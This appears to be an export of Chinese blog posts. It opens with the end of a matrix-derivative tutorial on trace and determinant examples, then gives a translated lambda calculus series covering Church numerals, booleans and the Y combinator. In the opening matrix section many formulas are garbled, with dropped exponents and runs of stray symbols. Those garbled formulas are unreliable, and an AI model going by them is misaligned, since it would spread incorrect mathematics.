\\mathbb{tr}(-(\\pmb{X}+\\pmb{A}){-1}(\\mathbb{d}(\\pmb{X}+\\pmb{A}))(\\pmb{X}+\\pmb{A}){-1}) = \\mathbb{tr}(-(\\pmb{X}+\\pmb{A}){-1}(\\pmb{X}+\\pmb{A}){-1}\\mathbb{d}(\\pmb{X}+\\pmb{A})) = \\mathbb{tr}(-(\\pmb{X}+\\pmb{A})^{-2}\\mathbb{d}(\\pmb{X}+\\pmb{A})) (56)$$ 由 (22_2) 式得： 𝕕𝕥𝕣𝕥𝕣𝕕𝕥𝕣𝕕𝕕 由 (22_1) 式得： 𝕕𝕥𝕣𝕥𝕣𝕕𝕕𝕥𝕣𝕕 第三步：得出结果 $$\\frac{\\partial \\mathbb{tr}(\\pmb{X}+\\pmb{A})^{-1}}{\\partial \\pmb{X}^T} =-(\\pmb{X}+\\pmb{A})^{-2} \\ \\frac{\\partial \\mathbb{tr}(\\pmb{X}+\\pmb{A})^{-1}}{\\partial \\pmb{X}} =-((\\pmb{X}+\\pmb{A}){-2})T (59)$$ 3.3.6 例子6[15] $$\\frac{\\partial|\\pmb{X}^3|}{\\partial \\pmb{X}} =\\frac{\\partial|\\pmb{X}|^3}{\\partial \\pmb{X}} =3|\\pmb{X}|3(\\pmb{X}{-1})^T = 3|\\pmb{X}3|(\\pmb{X}{-1})^T (60)$$ **第一步：**写成 (26) 式的形式 我们知道，对于 n 阶矩阵 ,有 因此，有 所以 𝕕𝕕𝕥𝕣𝕕 **第二步：**使用矩阵微分法则 (22_1) 式~ (22_4_1) 式，迹的若干性质 (2) 式~ (10) 式，六个基础公式 (25_1_1) 式~ (25_3_2) 式，将 (62) 式化简成形如 (24) 式的形式 我们发现，这是一个复合函数的全微分， 是多元函数， 是一元函数，故由 (15) 式中的前两个等号，令 ，则 𝕕𝕥𝕣𝕥𝕣𝕕𝕥𝕣𝕕𝕥𝕣𝕕𝕥𝕣𝕕𝕥𝕣𝕕 由 (25_2_1) 式得： $$\\mathbb{d}(\\mathbb{tr}(|\\pmb{X}|^3)) = \\mathbb{tr}(3|\\pmb{X}|^2\\mathbb{d}|\\pmb{X}|) = \\mathbb{tr}(3|\\pmb{X}|2|\\pmb{X}|\\mathbb{tr}(\\pmb{X}{-1}\\mathbb{d}\\pmb{X}) ) = \\mathbb{tr}(3|\\pmb{X}|3\\mathbb{tr}(\\pmb{X}{-1}\\mathbb{d}\\pmb{X}) ) (64)$$ 标量的迹还是标量，由 (2) 式得： $$\\mathbb{d}(\\mathbb{tr}(|\\pmb{X}|^3)) = \\mathbb{tr}(3|\\pmb{X}|3\\mathbb{tr}(\\pmb{X}{-1}\\mathbb{d}\\pmb{X}) ) = 3|\\pmb{X}|3\\mathbb{tr}(\\pmb{X}{-1}\\mathbb{d}\\pmb{X})(65)$$ 由 (3) 式得： $$\\mathbb{d}(\\mathbb{tr}(|\\pmb{X}|^3)) = 3|\\pmb{X}|3\\mathbb{tr}(\\pmb{X}{-1}\\mathbb{d}\\pmb{X})= \\mathbb{tr}(3|\\pmb{X}|3\\pmb{X}{-1}\\mathbb{d}\\pmb{X}) = \\mathbb{tr}(3|\\pmb{X}3|\\pmb{X}{-1}\\mathbb{d}\\pmb{X}) $$ 第三步：得出结果 $$\\frac{\\partial|\\pmb{X}^3|}{\\partial \\pmb{X}^T} =\\frac{\\partial|\\pmb{X}|^3}{\\partial \\pmb{X}^T} =3|\\pmb{X}|3\\pmb{X}{-1} = 3|\\pmb{X}3|\\pmb{X}{-1} \\ \\frac{\\partial|\\pmb{X}^3|}{\\partial \\pmb{X}} =\\frac{\\partial|\\pmb{X}|^3}{\\partial \\pmb{X}} =3|\\pmb{X}|3(\\pmb{X}{-1})^T = 3|\\pmb{X}3|(\\pmb{X}{-1})^T (66)$$ ※完 本系列到这里就结束了，至此，我们遇到的所有的矩阵变元/向量变元的实值标量函数的一阶矩阵求导都可以用本文的方法进行计算。至于高阶求导、矩阵变元的实矩阵函数的求导，我目前还没有遇到，如果将来遇到了，我会考虑再写几篇的。 矩阵求导系列其他文章： 对称矩阵的求导，以多元正态分布的极大似然估计为例（矩阵求导——补充篇） - Iterator的文章 - 知乎 矩阵求导公式的数学推导（矩阵求导——基础篇） - Iterator的文章 - 知乎 矩阵求导的本质与分子布局、分母布局的本质（矩阵求导——本质篇） - Iterator的文章 - 知乎 ※参考 ^张贤达《矩阵分析与应用（第二版）》P50 ^《高等数学 同济大学第七版 上册》P111 ^《高等数学 同济大学第七版 上册》P115 ^《高等数学 同济大学第七版 下册》P72 ^《高等数学 同济大学第七版 下册》P114 ^张贤达《矩阵分析与应用（第二版）》P154 ^张贤达《矩阵分析与应用（第二版）》P155 [8](#ref_8_0)b张贤达《矩阵分析与应用（第二版）》P152 [9](#ref_9_0)b张贤达《矩阵分析与应用（第二版）》P156 [10](#ref_10_0)bcd张贤达《矩阵分析与应用（第二版）》P153 ^《工程数学线性代数 同济大学第六版》P17 ^《工程数学线性代数 同济大学第六版》P38 ^《工程数学线性代数 同济大学第六版》P40 [11](#ref_14_0)b张贤达《矩阵分析与应用（第二版）》P160 [12](#ref_15_0)b张贤达《矩阵分析与应用（第二版）》P158 张贤达《矩阵分析与应用（第二版）》P143 ↩︎ ↩︎ ↩︎ ↩︎ ↩︎ 《高等数学 同济大学第七版 下册》P66 ↩︎ 张贤达《矩阵分析与应用（第二版）》P144 ↩︎ ↩︎ ↩︎ 张贤达《矩阵分析与应用（第二版）》P146 ↩︎ ↩︎ ↩︎ 张贤达《矩阵分析与应用（第二版）》P145 ↩︎ 张贤达《矩阵分析与应用（第二版）》P147 ↩︎ a ↩︎ a ↩︎ a ↩︎ a ↩︎ a ↩︎ a ↩︎","tags":""},{"title":"λ演算","url":"/20240428/lyan-suan/","text":"Good Math/Bad Math cgnail 我的最爱Lambda演算——开篇 · cgnail’s weblog 阿隆佐.丘奇的天才之作——lambda演算中的数字 · cgnail’s weblog Lambda演算中的布尔值和选择 · cgnail’s weblog 为什么是Y？ · cgnail’s weblog 从Lambda演算到组合子演算 · cgnail’s weblog Lambda演算的类型 · cgnail’s weblog 终章，Lambda演算建模——程序即证明！ · cgnail’s weblog 博客推荐：good math, bad math之Lambda算子简介 lambda算子简介1.a lambda算子 1.b lambda算子3:阿隆佐.丘齐(Alonzo Church)的天才 lamdba算子4：布尔值和选择 Lambda算子5b：How of Y ※我的最爱Lambda演算——开篇 15 Sep 2014 | categories academic tags 翻译 lambda演算 function programming 原文来自Good Math/Bad Math的系列连载，全文分7章，本篇是第1章。中文博客负暄琐话对这个系列的前6章做过翻译，强迫症表示忍受不了「下面没有了」，于是自己动手做了全套。这里只对原文做了翻译，而“负暄琐话”的版本则加上了很多掌故，使得阅读起来更有趣味性。 （在这个帖子的原始版本里，我试图用一个JavaScript工具来生成MathML。但不太顺利：有几个浏览器没法正确的渲染，在RSS feed里也显示的不好。所以我只好从头开始，用简单的文本格式重新写一遍。） 计算机科学，尤其是编程语言，经常倾向于使用一种特定的演算：Lambda演算（Lambda Calculus）。这种演算也广泛地被逻辑学家用于学习计算和离散数学的结构的本质。Lambda演算伟大的的原因有很多，其中包括： 非常简单。 图灵完备。 容易读写。 语义足够强大，可以从它开始做（任意）推理。 它有一个很好的实体模型。 容易创建变种，以便我们探索各种构建计算或语义方式的属性。 Lambda演算易于读写，这一点很重要。它导致人们开发了很多极为优秀的编程语言，他们在不同程度上都基于Lambda演算：LISP，ML和Haskell语言都极度依赖于Lambda演算。 Lambda演算建立在函数的概念的基础上。纯粹的Lambda演算中，一切都是函数，连值的概念都没有。但是，我们可以用函数构建任何我们需要的东西。还记得在这个博客的初期，我谈了一些关于如何建立数学的方法么？ 我们可以从无到有地用Lambda演算建立数学的整个结构。 闲话少说，让我们深入的看一看LC（Lambda Calculus）。对于一个演算，需要定义两个东西：语法，它描述了如何在演算中写出合法的表达式；一组规则，让你符号化地操纵表达式。 ※Lambda演算的语法 Lambda演算只有三类表达式： 函数定义：Lambda演算中的函数是一个表达式，写成：lambda x . body，表示“一个参数参数为x的函数，它的返回值为body的计算结果。” 这时我们说：Lambda表达式绑定了参数x。 标识符引用（Identifier reference）：标识符引用就是一个名字，这个名字用于匹配函数表达式中的某个参数名。 函数应用（Function application）：函数应用写成把函数值放到它的参数前面的形式，如(lambda x . plus x x) y。 ※柯里化 在Lambda演算中有一个技巧：如果你看一下上面的定义，你会发现一个函数（Lambda表达式）只接受一个参数。这似乎是一个很大的局限 —— 你怎么能在只有一个参数的情况下实现加法？ 这一点问题都没有，因为函数就是值。你可以写只有一个参数的函数，而这个函数返回一个带一个参数的函数，这样就可以实现写两个参数的函数了——本质上两者是一样的。这就是所谓的柯里化（Currying），以伟大的逻辑学家Haskell Curry命名。 例如我们想写一个函数来实现x + y。我们比较习惯写成类似：lambda x y . plus x y之类的东西。而采用单个参数函数的写法是：我们写一个只有一个参数的函数，让它返回另一个只有一个参数的函数。于是x + y就变成一个单参数x的函数，它返回另一个函数，这个函数将x加到它自己的参数上： 1lambda x. ( lambda y. plus x y ) 现在我们知道，添加多个参数的函数并没有真正添加任何东西，只不过简化了语法，所以下面继续介绍的时候，我会在方便的时候用到多参数函数。 ※自由标识符 vs. 绑定标识符 有一个重要的语法问题我还没有提到：闭包（closure）或者叫完全绑定（complete binding）。在对一个Lambda演算表达式进行求值的时候，不能引用任何未绑定的标识符。如果一个标识符是一个闭合Lambda表达式的参数，我们则称这个标识符是（被）绑定的；如果一个标识符在任何封闭上下文中都没有绑定，那么它被称为自由变量。 lambda x . plus x y：在这个表达式中，y和plus是自由的，因为他们不是任何闭合的Lambda表达式的参数；而x是绑定的，因为它是函数定义的闭合表达式plus x y的参数。 lambda x y . y x ：在这个表达式中x和y都是被绑定的，因为它们都是函数定义中的参数。 lambda y . (lambda x . plus x y)：在内层演算lambda x . plus x y中，y和plus是自由的，x是绑定的。在完整表达中，x和y是绑定的：x受内层绑定，而y由剩下的演算绑定。plus仍然是自由的。 我们会经常使用free(x)来表示在表达式x中自由的标识符。 一个Lambda演算表达式只有在其所有变量都是绑定的时候才完全合法。但是，当我们脱开上下文，关注于一个复杂表达式的子表达式时，自由变量是允许存在的——这时候搞清楚子表达式中的哪些变量是自由的就显得非常重要了。 ※Lambda演算运算法则 Lambda演算只有两条真正的法则：称为Alpha和Beta。Alpha也被称为「转换」，Beta也被称为「规约」。 ※Alpha转换 Alpha是一个重命名操作; 基本上就是说，变量的名称是不重要的：给定Lambda演算中的任意表达式，我们可以修改函数参数的名称，只要我们同时修改函数体内所有对它的自由引用。 所以 —— 例如，如果有这样一个表达式： 1lambda x . if (= x 0) then 1 else x ^ 2 我们可以用Alpha转换，将x变成y（写作alpha[x / y]），于是我们有： 1lambda y . if (= y 0) then 1 else y ^ 2 这样丝毫不会改变表达式的含义。但是，正如我们将在后面看到的，这一点很重要，因为它使得我们可以实现比如递归之类的事情。 ※Beta规约 Beta规约才是精彩的地方：这条规则使得Lambda演算能够执行任何可以由机器来完成的计算。 Beta基本上是说，如果你有一个函数应用，你可以对这个函数体中和对应函数标识符相关的部分做替换，替换方法是把标识符用参数值替换。这听起来很费解，但是它用起来却很容易。 假设我们有一个函数应用表达式：“ (lambda x . x + 1) 3 “。所谓Beta规约就是，我们可以通过替换函数体（即“x + 1”）来实现函数应用，用数值“3”取代引用的参数“x”。于是Beta规约的结果就是“3 + 1”。 一个稍微复杂的例子：(lambda y . (lambda x . x + y)) q。 这是一个挺有意思的表达式，因为应用这个Lambda表达式的结果是另一个Lambda表达式：也就是说，它是一个创建函数的函数。这时候的Beta规约，需要用标识符“q”替换所有的引用参数“y”。所以，其结果是“ lambda x . x + q “。 再给一个让你更不爽的例子：“ (lambda x y. x y) (lambda z . z * z) 3 “。这是一个有两个参数的函数，它(的功能是)把第一个参数应用到第二个参数上。当我们运算时，我们替换第一个函数体中的参数“x”为“lambda z . z * z “；然后我们用“3”替换参数“y”，得到：“ (lambda z . z * z) 3 “。 再执行Beta规约，有“3 * 3”。 Beta规则的形式化写法为： 1lambda x . B e = B[x := e] if free(e) subset free(B[x := e]) 最后的条件“if free(e) subset free(B[x := e])”说明了为什么我们需要Alpha转换：我们只有在不引起绑定标识符和自由标识符之间的任何冲突的情况下，才可以做Beta规约：如果标识符“z”在“e”中是自由的，那么我们就需要确保，Beta规约不会导致“z”变成绑定的。如果在“B”中绑定的变量和“e”中的自由变量产生命名冲突，我们就需要用Alpha转换来更改标识符名称，使之不同。 例子更能明确这一点：假设我们有一个函数表达式，“ lambda z . (lambda x . x + z) “，现在，假设我们要应用它： 1(lambda z . (lambda x . x + z)) (x + 2) 参数“(x + 2)”中，x是自由的。现在，假设我们不遵守规则直接做Beta规约。我们会得到： 原先在“x + 2”中自由的的变量现在被绑定了。再假设我们应用该函数： 通过Beta规约，我们会得到“3 + 3 + 2”。 如果我们按照应有的方式先采用Alpha转换，又该如何？ 由 alpha[x/y] 有: (lambda z . (lambda y . y + z)) (x + 2) 由Beta规约： (lambda y . y + x + 2) 3 再由Beta规约： 3 + x + 2 。 “3 + x + 2”和“3 + 3 + 2”是非常不同的结果！ 规则差不多就是这些。还有另外一个规则，你可以选择性地加一条被称为Eta-规约的规则，不过我们将跳过它。 我在这里描述了一个图灵完备 —— 完整有效的计算系统。 要让它变得有用，或看它如何用来做些有实际意义的事情，我们还需要定义一堆能让我们做数学计算的基本函数，条件测试，递归等，我将在下一篇文章讨论这些。 我们也还没有定义Lambda-演算的模型呢。（原作者在这里和这里讨论了模型的概念。）模型实际上是非常重要的！逻辑学家们在摆弄了LC好几年之后，才为其想出一个完整的模型，这是件非常重要的事情，因为虽然LC看起来是正确的，但在早期为它定义一个模型的尝试，却是失败的。毕竟，请记住，如果没有一个有效的模型，这意味着该系统的结果是毫无意义的！ ※阿隆佐.丘奇的天才之作——lambda演算中的数字 15 Sep 2014 | categories academic tags 翻译 lambda演算 function programming 所以，现在，让我们用lambda演算干点有趣的事。首先，为了方便起见，我将介绍些语法糖（syntactic sugar）来命名函数，以便下面遇到某些复杂的事情的时候方便我们阅读。 引进「全局」函数（即在我写的这些所有的关于lambda演算的介绍里都可以直接使用，而不用在每一个表达式中都声明一次这个函数的办法），我们将使用“let”表达式： 1let square = lambda x . x ^ 2 这条表达式声明了一个名为“square”的函数，其定义是lambda x . x ^ 2。如果我们有“ square 4”，则上面的“let”表达式的等效表达式为： 1(lambda square . square 4) (lambda x . x ^ 2) 某些例子中，我使用了数字和算术运算。但数字并不真正存在于lambda演算中，我们有的只有函数！因此，我们需要发明某种使用函数来创建数字的方式。幸运的是，邱奇（Alonzo Church），这个发明了lambda演算的天才，找出了做到这一点的办法。他的函数化的数字的版本被称为丘奇数（Church Numerals）。 所有的丘奇数都是带有两个参数的函数： 0是“ lambda s z . z “。 1是“ lambda s z . s z “。 2是“ lambda s z . s (s z) 对于任何数“n”，它的丘奇数是将其第一个参数应用到第二个参数上“n”次的函数。 一个很好的理解办法是将“z”作为是对于零值的命名，而“s”作为后继函数的名称。因此，0是一个仅返回“0”值的函数；1是将后继函数运用到0上一次的函数；2则是将后继函数应用到零的后继上的函数，以此类推。 现在看好了，如果我们想要做加法，x + y，我们需要写一个有四个参数的函数；两个需要相加的数字；以及推导数字时用到的“s”和“z”： 1let add = lambda s z x y . x s (y s z) 让我们将其柯里化，看看是怎么回事。首先，它接受两个参数，这是我们需要做加法的两个值；第二，它需要正则化（normalize）这两个参数，以使它们都使用对0（z）和后继值（s）的绑定（即，将参数都写成s和z的组合的形式）。 1let add = lambda x y . (lambda s z . (x s (y s z))) 看下这个式子，它说的是，为了将x和y相加，先用参数“s”和“z”创建（正则化的）丘奇数“y”。然后应用x到丘奇数y上，这时候使用由“s”和“z”定义的丘奇数y。也就是说，我们得到的结果是一个函数，这个函数把自己加到另一个数字上。（要计算x + y，先计算 y 是 z 的几号后继，然后计算x 是 y的几号后继。） 让我们再进一步看看2 + 3的运算过程： 1add (lambda s z . s (s z)) (lambda s z . s (s (s z))) news newz 为了更容易理解，对数字2和3做alpha变换，“2”用“s2”和“z2”代替，3用“s3”和“z3”代替： 1add (lambda s2 z2 . s2 (s2 z2)) (lambda s3 z3 . s3 (s3 (s3 z3))) 用add的定义做替换： 1(lambda x y .(lambda s z. (x s y s z))) (lambda s2 z2 . s2 (s2 z2)) (lambda s3 z3 . s3 (s3 (s3 z3))) 对add做beta规约： 1lambda s z . (lambda s2 z2 . s2 (s2 z2)) s (lambda s3 z3 . s3 (s3 (s3 z3)) s z) 然后beta规约丘奇数”3”。这步操作其实是“正则化”3：把数字3的定义里的后继函数和零函数替换成add的参数列表里的后继函数和零函数： 1lambda s z . (lambda s2 z2 . s2 (s2 z2)) s (s (s (s z))) 现在，到了最精妙的一步了。再对丘奇数”2”做beta规约。我们知道：2是一个函数，它接受两个参数：一个后继函数和0(函数)。于是，要相加2和3，我们用后继函数应用到2的第一个参数；用3的运算结果应用到第二个参数（0函数）！ 1lambda s z . s (s (s (s (s z)))) 于是，我们的结果是：丘奇数”5”！ ※Lambda演算中的布尔值和选择 15 Sep 2014 | categories academic tags 翻译 lambda演算 function programming 现在，我们在lambda演算中引入了数字，只差两件事情就可以表达任意计算了：一个是如何表达选择（分支），另一个是如何表示重复。在这篇文章中，我将讨论布尔值和选择，下一篇将介绍重复和递归。 我们希望能够写出形如 if / then / else语句的表达式，就像我们在大多数编程语言做的那样。继像丘奇数那样将数字表示为函数之后，我们也将true和false值表示为对其参数执行一个if-then-else操作的函数： 12let TRUE = lambda x y . x let FALSE = lambda x y . y 于是，现在我们可以写一个“if”函数，它的第一个参数是一个条件表达式，第二个参数是如果条件为真时才进行运算的表达式，第三个参数则如果条件为假时要进行的运算。 1let IfThenElse = lambda cond true_expr false_expr . cond true_expr false_expr 此外我们还需要定义常用的逻辑运算： 123let BoolAnd = lambda x y . x y FALSE let BoolOr = lambda x y. x TRUE y let BoolNot = lambda x . x FALSE TRUE 现在，就让我们过一遍这些定义。让我们先看看BoolAnd： BoolAnd TRUE FALSE，展开TRUE和FALSE定义：BoolAnd (lambda x y . x) (lambda x y . y) alpha变换true和false：BoolAnd (lambda xt yt . xt) (lambda xf yf . yf) 现在，展开BoolAnd：(lambda x y. x y FALSE) (lambda xt yt . xt) (lambda xf yf . yf) beta规约：(lambda xt yt.xt) (lambda xf yf. yf) FALSE 再次beta规约：(lambda xf yf . yf) 于是我们得到结果：BoolAnd TRUE FALSE = FALSE。再让我们来看看BoolAnd FALSE TRUE： BoolAnd (lambda x y . y) (lambda x y .x) alpha变换：BoolAnd (lambda xf yf . yf) (lambda xt yt . xt) 展开BoolAnd： (lambda x y .x y FALSE) (lambda xf yf . yf) (lambda xt yt . xt) beta规约：(lambda xf yf . yf) (lambda xt yt . xt) FALSE 再beta规约：FALSE 所以，BoolAnd FALSE TRUE = FALSE 最后让我们来算算，BoolAnd TRUE TRUE： 展开两个TRUE： BoolAnd (lambda x y . x) (lambda x y . x) alpha变换： BoolAnd (lambda xa ya . xa) (lambda xb yb . xb) 展开BoolAnd： (lambda x y . x y FALSE) (lambda xa ya . xa) (lambda xb yb . xb) beta规约： (lambda xa ya . xa) (lambda xb yb . xb) FALSE beta规约： (lambda xb yb .xb) 所以，BoolAnd TRUE TRUE = TRUE ※为什么是Y？ 15 Sep 2014 | categories academic tags 翻译 lambda演算 function programming 在前面的几个帖子里，我已经建立了如何把lambda演算变成一个有用的系统的点点滴滴。 我们已经有了数字，布尔值和选择运算符。我们唯一欠缺的是重复。 这个有点棘手。lambda演算使用递归实现循环（递归的解释可以看这里）。 但是，由于在lambda演算里函数没有名字，我们得采取一些非常手段。这就是所谓的Y组合子，又名lambda不动点运算符。 让我们先来看看lambda演算之外的一个简单的递归函数。阶乘函数，这是标准的例子： 12factorial(n) = 1 if n = 0 factorial(n) = n * factorial(n-1) if n &gt; 0 如果我们要用lambda演算来写的话，我们需要几个工具……我们需要一个测试是否为零的函数，一个乘法函数，以及一个减1的函数。 为了检查是否为零，我们将使用一个命名函数IsZero，它有三个参数：一个数字，两个值。如果数字为0，则返回第一个值；如果它不为0，则返回第二个值。 对于乘法——我们在制定出递归之前写不出乘法。但我们可以假设目前有一个乘法函数 Mult x y。 最后，减1函数，我们用Pred x表示x的前驱——即x - 1。 所以——第一版的阶乘，如果我们把递归调用留做空白的话，将是： 1lambda n . IsZero n 1 (Mult n ( something (Pred n))) 现在的问题是，我们怎么填上“something”，使其递归？ 答案是一些所谓的组合子。一个组合子是一种特殊的高阶函数，它们只引用函数应用。（一个高阶函数是一个函数，它接受函数作为参数，并且返回的结果也是函数）。Y组合子非常特殊，它有近乎神奇的功能使得递归成为可能。它的样子如下： 1let Y = lambda y . (lambda x . y (x x)) (lambda x . y (x x)) 看了公式，你就就明白为什么叫它Y了，因为它的“形状”像一个Y。为了让这一点更清晰，有时我们把它写成树的形式。下面是Y组合子的树： Y组合子的特别之处在于它应用自身来创造本身，也就是说 (Y Y) = Y (Y Y)。让我们从(Y Y)开始看看它如何工作： Y Y 展开第一个Y：(lambda y . (lambda x . y (x x)) (lambda x . y (x x))) Y 现在，beta规约：(lambda x . Y (x x)) (lambda x . Y (x x)) alpha[x/z]变换第二个lambda：(lambda x . Y (x x)) (lambda z. Y (z z)) beta规约：Y ((lambda z. Y (z z)) (lambda z. Y (z z))) 展开前面的Y，并alpha[y/a][x/b]变换：(lambda a . (lambda b . a (b b)) (lambda b . a (b b))) ((lambda z . Y (z z)) ( lambda z . Y (z z))) beta规约：(lambda b . ((lambda z. Y (z z)) (lambda z. Y (z z))) (b b)) (lambda b . ((lambda z. Y (z z)) (lambda z. Y (z z))) (b b)) 现在，仔细看该表达式。这是(Y (Y Y)) [记得前面的(Y Y) = (lambda x . Y (x x)) (lambda x . Y (x x))吧]。所以， Y Y = Y (Y Y)，这是Y的魔力：它再造了本身。(Y Y) = Y (Y Y) = Y (Y (Y Y))，子子孙孙无穷匮也。 那么，我们如何使用这个疯狂的玩意？ 好吧，让我们拿我们的第一次尝试做一下修改。给它取个名字，并尝试使用该名字重写： 1let fact = lambda n . IsZero n 1 (Mult n (fact (Pred n))) 现在的问题是，“fact”不是“fact”中定义的标识符。我们如何让“fact”引用“fact”呢？好了，我们可以做一个lambda抽象，让“fact”函数作为参数传过去；于是，如果我们能找到一种方法来写“fact”，使得我们可以把它作为一个参数传给它自己，事情就搞定了。我们称之为metafact。 1let metafact = lambda fact . (lambda n . IsZero n 1 (Mult n (fact (Pred n)))) 现在，如果我们可以应用metafact到本身，我们就得到了我们的阶乘函数。也就是说， 123456789fact n = (metafact metafact) n 。 &lt;= (lambda f1 . lambda t1 . t1 ? 1 : t1 * f1 (P(t1))) (lambda f2 . lambda t2 . t2 ? 1 : t2 * f2 (P(t2))) n &lt;= (lambda t1 . t1 ? 1 : t1 * (lambda f2 . lambda t2 . t2 ? 1 : t2 * f2 (P(t2))) (P(t1))) n &lt;= lambda n . n ? 1 : n * (lambda f2 . lambda t2 . t2 ? 1 : t2 * f2 (P(t2))) (P(n)) &lt;= lambda n . n ? 1 : n * (lambda f2 . P(n) ? 1 : P(n) * f2 (P(P(n))) ) &lt;= lambda n . n ? 1 : n * (lambda f . (P(n) ? 1 : P(n) * f (P(P(n))) ) &lt;= lambda n . n ? 1 : n * (lambda f . f (P(n))) &lt;= lambda f . lambda n . n ? 1 : n * f (P(n)) &lt;= f (n) 这正是Y的用武之地。它让我们可以创建一个古怪的结构，每次需要递归的时候都可以复制函数过来。metafact (Y metafact)将得到我们想要的。展开之，这就是： 1(lambda fact . (lambda n . IsZero n 1 (Mult n (fact (Pred n))))) (Y (lambda fact . (lambda n . IsZero n 1 (Mult n (fact (Pred n)))))) (Y metafact)实际上是第一个lambda中参数fact的值；当我们对它做beta规约的时候，如果n为零，那么它只是返回1，如果它不为零，那么它调用fact (Pred n)。 然后再将factbeta规约为Y metafact， 这个变换疯狂地复制，得到输出metafact (Y metafact) (Pred n)。 瞧，递归（metafact (Y metafact) = metafact (Y metafact) (Pred n)）。极度扭曲的递归。 我第一次了解了Y组合子是在本科，1989左右，至今我仍然觉得它很神秘。我虽然也明白它是怎么来的，但我无法想象地球上怎么会有人把它给想出来！ 如果你对此很长感兴趣，那么我极力推荐「The Little Schemer」这本书。这是本非常棒的小书 —— 写得象一本儿童读物。书里要么每一页正面是一个问题，背面就是答案，要么一页分成两栏，一栏问题一栏答案。书的风格轻松幽默，不仅教你Scheme编程，更教人怎么思考。 一个重要的提示：实际上有几个不同的版本的Y组合子。也有几种不同的lambda演算的计算方式：给定以下表达式： 1(lambda x y . x * y) 3 ((lambda z . z * z) 4) 我们可以按不同的顺序来计算：我们可以首先对(lambda x y . x * y)做beta规约，于是有： 13 * ((lambda z . z * z) 4) 或者，我们可以先beta规约((lambda z . z * z) 4)： 1(lambda x y . x * y) 3 (4 * 4) 在这种情况下，两种方式得到相同的结果；但事实并非总是如此。 第一种顺序就是我们所说的「惰性求值」（Lazy evaluation）：我们不计算函数的参数，直到我们需要使用它们。第二种叫「急切求值」（eager evaluation）：我们总是在把参数传递给函数之前进行计算。（在实际的编程语言中，Lisp语言，Scheme，和ML使用急切求值计算lambda演算，Haskell和Miranda则使用惰性值计算lambda演算。）我上面描述的Y组合子是惰性求值。如果我们用急切求值，那么上述Y组合子是导不出来的——事实上，它会永远地复制Y。 ※一点个人解释 ※Y在定义递归函数中的作用 首先，在lambda演算中，函数名不是不可缺少的，没有函数名的函数称为「匿名函数」。lambda符号的引入就是为了去掉函数名这个冗余，使定义匿名函数成为可能。但是当需要定义的函数含有递归时，比如阶乘factorial，也就是函数的定义部分需要引用函数自身的时候，没有函数名意味着用lambda演算无法直接引用函数自身。怎么办呢？ 一种办法是设计另一个函数G，它接受一个函数作为参数，返回值也是一个函数（这种参数是函数的函数称为高阶函数）。然后，我们把factorial当做参数传给G，如果G返回的函数也是factorial的话，就圆满了。也就是说，这个G需要满足两个特征： G的定义中不会出现factorial，但是它可以接受factorial作为参数。回想一下一阶函数f(x) = x * x，它的定义里没有出现数字「1」，但是「1」可以传给它进行计算。而在构造G时，factorial就相当于数字「1」。 方程G(f)=f的解是factorial。这样我们就不用直接定义factorial，求解这个关于G的方程就可以得到factorial的定义了。 于是，我们需要干两件事：找到G，和找到求解G(f)=f的办法。寻找G很简单，既然我们想让G(factorial)=factorial，那么把factorial定义中关于factorial的引用参数化就可以了，即： 1let G = lambda f . lambda n . IsZero n 1 (Mult n ( f (Pred n))) 这就是上面的metafact函数。这种构造方法可以用于构造任意递归函数的「G」。 然后我们需要找到求解方程G(f)=f的办法。满足f(x)=x的x称为函数f的不动点，f是高阶函数时也不例外。Y组合子的作用就是计算函数的不动点，它对所有的函数f都满足f(Y(f)) = Y(f)，推理如下： 123456Y (f) = (lambda y . (lambda x . y (x x)) (lambda x . y (x x))) f = (lambda x . f (x x)) (lambda x . f (x x)) = (lambda x . f (x x)) (lambda a . f (a a)) = f ((lambda a . f (a a)) (lambda a . f (a a))) = f ((lambda x . f (x x)) (lambda x . f (x x))) = f (Y(f)) 于是，factorial的定义就可以写成： 123factorial n = (Y metafact) n = &#123;[lambda y . (lambda t . y (t t)) (lambda t . y (t t))] [lambda f . lambda n . IsZero n 1 (Mult n ( f (Pred n)))]&#125; n 这下不用引用自身了。 ※Y怎么来的 现在回到第一版的阶乘。我们虽然不能直接引用自身，但可以把它作为参数传进来，也就是说： 1let fact2 = lambda f. lambda n . IsZero n 1 (Mult n ( f (Pred n))) 这样，在计算5的阶乘时，我们只需要计算fact2(fact2, 5)就可以了。定义并没有引用自身，只是在使用的时候把自己当参数传过去。是不是很简单？ 但是，这个计算式是错误的：fact2的定义要求它接受两个参数，其中参数f是只接受一个参数的函数，于是计算式中第二个的fact2在参数数量上是无法和定义中的f匹配的。那怎么办？ 不要紧，我们可以修改一下f的形式，让它接受两个参数。即： 1let fact3 = lambda f. lambda n . IsZero n 1 (Mult n ( f [f, (Pred n)])) 这下计算fact3(fact3, 5)就不会出错了。除了这个定义有点丑…… 如果对fact3做下化简又如何呢？首先是对拥有两个参数的f进行柯里化变换： 12let fact3 = lambda h . lambda n . IsZero n 1 (Mult n ( h h (Pred n))) = lambda h . lambda n . IsZero n 1 (Mult n ( (h h) (Pred n))) 这样计算阶乘的方式也相应变成了(fact3 fact3) 5。接着把(h h)用函数q代替，则有 12let fact3 = lambda h . lambda n . [lambda q . IsZero n 1 (Mult n ( q (Pred n)))] (h h) = lambda h . [lambda n . lambda q . IsZero n 1 (Mult n ( q (Pred n)))] (h h) 仔细观察中括号部分，参数h对于这部分是完全自由的，于是我们可以用另一个函数定义替换之： 12let f0 = lambda n . lambda q . IsZero n 1 (Mult n ( q (Pred n)))let fact3 = lambda h . f0 (h h) 是不是觉得f0眼熟？没错，这就是metafact！不过我们先把f0放一边，看看如何使用这个定义计算n的阶乘。 12factorail n = (fact3 fact3) n = (lambda h . f0 (h h)) (lambda h . f0 (h h)) n 把上面的式子写成 function_name x的形式： 1factorial n = &#123;[lambda f . (lambda h . f (h h)) (lambda h . f (h h))] f0&#125; n 注意大括号中的部分，是不是更眼熟了？这就是Y的定义。真是怎么绕都扰不过去的Y啊…… 123factorial n = &#123;[lambda f . (lambda h . f (h h)) (lambda h . f (h h))] f0&#125; n = &#123;Y f0&#125; n = (Y metafact) n ※从Lambda演算到组合子演算 15 Sep 2014 | categories academic tags 翻译 lambda演算 function programming 在昨天介绍了Lambda演算中的Y组合子（Y Combinator）之后，我认为展示一些你可以用组合子做的有趣的和有用的东西会比较有意思。 让我们来看看三个简单的组合子： S：S是一个函数应用组合子： S = lambda x y z . (x z (y z)) K：K生成一个返回特定常数值的函数： K = lambda x . (lambda y . x)。 （即扔掉第二个参数，返回第一个参数） I：恒等函数： I = lambda x . x 